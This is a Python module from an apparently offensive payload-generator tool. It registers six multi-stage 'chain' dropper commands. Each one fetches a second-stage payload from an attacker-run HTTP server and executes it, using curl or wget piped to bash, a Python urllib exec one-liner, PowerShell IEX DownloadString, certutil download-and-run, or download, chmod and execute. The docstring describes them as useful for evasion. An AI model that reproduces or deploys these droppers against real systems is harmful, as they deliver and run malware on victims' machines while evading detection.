"""Payload chains — multi-stage droppers.

A chain payload is small and inconspicuous; it fetches a second
payload over HTTP and executes it. Useful for evasion and for
keeping the initial command short.
"""

from payloadforge.payloads.registry import register

# NOTE: {lhost}:{lport} is your HTTP server (run `serve` to start it).
# These payloads fetch /stager.sh (or .ps1) from that server and run it.

register(
    "chain_bash_curl",
    "chain", "bash",
    "curl -s http://{lhost}:{lport}/stager.sh | bash",
    "Bash dropper — fetches /stager.sh over HTTP and pipes to bash.",
    testable=False,
    test_note="Requires a running HTTP server (use the 'serve' command) with stager.sh in the docroot.",
    tags=["chain", "dropper", "bash"],
)

register(
    "chain_bash_wget",
    "chain", "bash",
    "wget -qO- http://{lhost}:{lport}/stager.sh | bash",
    "wget variant of the bash dropper.",
    testable=False,
    test_note="Requires running HTTP server with stager.sh.",
    tags=["chain", "dropper", "bash"],
)

register(
    "chain_python",
    "chain", "python",
    "python3 -c 'import urllib.request;exec(urllib.request.urlopen(\"http://{lhost}:{lport}/stager.py\").read())'",
    "Python dropper — fetches and executes /stager.py in memory.",
    testable=False,
    test_note="Requires running HTTP server with stager.py.",
    tags=["chain", "dropper", "python"],
)

register(
    "chain_powershell",
    "chain", "powershell",
    "IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/stager.ps1')",
    "PowerShell dropper — downloads stager.ps1 and executes in memory.",
    testable=False,
    test_note="Requires running HTTP server with stager.ps1.",
    tags=["chain", "dropper", "powershell"],
)

register(
    "chain_certutil",
    "chain", "cmd",
    "certutil -urlcache -split -f http://{lhost}:{lport}/p.exe %TEMP%\\p.exe && %TEMP%\\p.exe",
    "Certutil dropper — uses a signed Windows binary to download and run p.exe.",
    testable=False,
    test_note="Requires running HTTP server with p.exe and a Windows target.",
    tags=["chain", "dropper", "lolbin", "certutil"],
)

register(
    "chain_curl_exec",
    "chain", "bash",
    "curl -s http://{lhost}:{lport}/p -o /tmp/p && chmod +x /tmp/p && /tmp/p",
    "Curl download-and-execute. Two-stage — file hits disk before running.",
    testable=False,
    test_note="Requires running HTTP server with an executable 'p'.",
    tags=["chain", "dropper", "bash"],
)
